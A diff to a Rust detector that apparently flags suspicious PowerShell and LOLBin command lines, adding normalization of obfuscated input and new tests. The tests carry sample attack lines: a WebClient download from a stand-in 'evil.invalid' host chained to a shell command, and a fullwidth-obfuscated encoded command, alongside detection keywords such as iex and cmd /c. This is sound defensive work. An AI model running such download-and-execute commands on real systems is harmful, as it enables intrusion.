@@ -1,3 +1,4 @@
+use crate::command_line::{CommandLineNormalizationProfile, analyze_command_line};
 use crate::detector::{
     DetectionFinding, DetectionStrategy, ProcessStartEvent, TelemetryEvent, TelemetryPayload,
 };
@@ -16,6 +17,8 @@ pub struct SuspiciousScriptingProfile {
     pub download_execute_indicators: Vec<String>,
     #[serde(default = "default_lolbin_processes")]
     pub lolbin_processes: Vec<String>,
+    #[serde(default)]
+    pub command_line_normalization: CommandLineNormalizationProfile,
     #[serde(default = "default_high_confidence_threshold")]
     pub high_confidence_threshold: f64,
     #[serde(default = "default_medium_confidence_threshold")]
@@ -28,6 +31,7 @@ impl Default for SuspiciousScriptingProfile {
             encoded_indicators: default_encoded_indicators(),
             download_execute_indicators: default_download_execute_indicators(),
             lolbin_processes: default_lolbin_processes(),
+            command_line_normalization: CommandLineNormalizationProfile::default(),
             high_confidence_threshold: default_high_confidence_threshold(),
             medium_confidence_threshold: default_medium_confidence_threshold(),
         }
@@ -39,6 +43,7 @@ pub struct SuspiciousScriptingDetector {
     encoded_indicators: Vec<String>,
     download_execute_indicators: Vec<String>,
     lolbin_processes: Vec<String>,
+    command_line_normalization: CommandLineNormalizationProfile,
     high_confidence_threshold: f64,
     medium_confidence_threshold: f64,
 }
@@ -58,6 +63,7 @@ impl Default for SuspiciousScriptingDetector {
                 .into_iter()
                 .map(|value| value.to_ascii_lowercase())
                 .collect(),
+            command_line_normalization: CommandLineNormalizationProfile::default(),
             high_confidence_threshold: default_high_confidence_threshold(),
             medium_confidence_threshold: default_medium_confidence_threshold(),
         }
@@ -85,6 +91,7 @@ impl SuspiciousScriptingDetector {
                 .into_iter()
                 .map(|value| value.to_ascii_lowercase())
                 .collect(),
+            command_line_normalization: profile.command_line_normalization,
             high_confidence_threshold: profile.high_confidence_threshold,
             medium_confidence_threshold: profile.medium_confidence_threshold,
         })
@@ -95,6 +102,7 @@ impl SuspiciousScriptingDetector {
             encoded_indicators: self.encoded_indicators.clone(),
             download_execute_indicators: self.download_execute_indicators.clone(),
             lolbin_processes: self.lolbin_processes.clone(),
+            command_line_normalization: self.command_line_normalization.clone(),
             high_confidence_threshold: self.high_confidence_threshold,
             medium_confidence_threshold: self.medium_confidence_threshold,
         }
@@ -106,21 +114,23 @@ impl SuspiciousScriptingDetector {
         process: &ProcessStartEvent,
     ) -> Option<DetectionFinding> {
         let process_name = process.process_name.to_ascii_lowercase();
-        let command_line = process.command_line.to_ascii_lowercase();
+        let command_line =
+            analyze_command_line(&process.command_line, &self.command_line_normalization);
         let is_powershell = process_name.contains("powershell") || process_name.contains("pwsh");
         let encoded = is_powershell
             && self
                 .encoded_indicators
                 .iter()
-                .any(|indicator| command_line.contains(indicator));
+                .any(|indicator| command_line.match_text.contains(indicator));
         let download_execute = self
             .download_execute_indicators
             .iter()
-            .any(|indicator| command_line.contains(indicator))
-            && (command_line.contains("iex")
-                || command_line.contains("invoke-expression")
-                || command_line.contains("start-process")
-                || command_line.contains("cmd /c"));
+            .any(|indicator| command_line.match_text.contains(indicator))
+            && (command_line.match_text.contains("iex")
+                || command_line.match_text.contains("invoke-expression")
+                || command_line.match_text.contains("start-process")
+                || command_line.match_text.contains("cmd /c")
+                || command_line.match_text.contains("cmd.exe /c"));
         let matched_lolbin = self
             .lolbin_processes
             .iter()
@@ -128,7 +138,7 @@ impl SuspiciousScriptingDetector {
             .cloned();
         let lolbin_abuse = matched_lolbin
             .as_deref()
-            .is_some_and(|lolbin| is_lolbin_abuse(lolbin, &command_line));
+            .is_some_and(|lolbin| is_lolbin_abuse(lolbin, &command_line.match_text));
 
         if !encoded && !download_execute && !lolbin_abuse {
             return None;
@@ -155,6 +165,9 @@ impl SuspiciousScriptingDetector {
                 "parent_process": process.parent_process,
                 "process_name": process.process_name,
                 "command_line": process.command_line,
+                "normalized_command_line": command_line.normalized,
+                "decoded_command_segments": command_line.decoded_segments,
+                "command_line_transforms": command_line.transforms,
                 "user": process.user,
                 "host_id": event.host_id,
                 "heuristics": {
@@ -200,6 +213,8 @@ impl DetectionStrategy for SuspiciousScriptingDetector {
             | TelemetryPayload::RegistryPersistence(_)
             | TelemetryPayload::FilePersistence(_)
             | TelemetryPayload::AuthenticationEvent(_)
+            | TelemetryPayload::CloudTrail(_)
+            | TelemetryPayload::KubernetesAudit(_)
             | TelemetryPayload::InfrastructureHealth(_)
             | TelemetryPayload::ThermalAnomaly(_)
             | TelemetryPayload::ResourceExhaustion(_) => Vec::new(),
@@ -271,6 +286,7 @@ fn default_medium_confidence_threshold() -> f64 {
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
     use super::{SuspiciousScriptingDetector, SuspiciousScriptingProfile};
+    use crate::command_line::CommandLineNormalizationProfile;
     use crate::detector::{DetectionStrategy, ProcessStartEvent, TelemetryEvent, TelemetryPayload};
     use swarm_core::pheromone::ThreatClass;
     use swarm_core::types::Severity;
@@ -376,8 +392,50 @@ mod tests {
     }
 
     #[test]
+    fn caret_and_environment_expansion_still_trigger_download_execute() {
+        let detector = SuspiciousScriptingDetector::default();
+        let findings = detector.evaluate(&process_event(
+            "powershell",
+            "powershell.exe (New-Object Net.WebClient).DownloadString('https://evil.invalid/payload'); %ComSpec% /c whoami",
+        ));
+
+        assert_eq!(findings.len(), 1);
+        assert_eq!(
+            findings[0].evidence["normalized_command_line"].as_str(),
+            Some(
+                "powershell.exe (New-Object Net.WebClient).DownloadString('https://evil.invalid/payload'); cmd /c whoami"
+            )
+        );
+    }
+
+    #[test]
+    fn fullwidth_encoded_command_is_normalized_before_matching() {
+        let detector = SuspiciousScriptingDetector::default();
+        let findings = detector.evaluate(&process_event(
+            "powershell",
+            "powershell.exe －ＥＮＣ SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==",
+        ));
+
+        assert_eq!(findings.len(), 1);
+    }
+
+    #[test]
     fn profile_round_trips() {
         let profile = SuspiciousScriptingProfile::default();
+        let detector = SuspiciousScriptingDetector::from_profile(profile.clone())
+            .expect("profile should be valid");
+        assert_eq!(detector.profile(), profile);
+    }
+
+    #[test]
+    fn explicit_normalization_profile_round_trips() {
+        let profile = SuspiciousScriptingProfile {
+            command_line_normalization: CommandLineNormalizationProfile {
+                decode_encoded_arguments: false,
+                ..CommandLineNormalizationProfile::default()
+            },
+            ..SuspiciousScriptingProfile::default()
+        };
         let detector = SuspiciousScriptingDetector::from_profile(profile.clone())
             .expect("profile should be valid");
         assert_eq!(detector.profile(), profile);
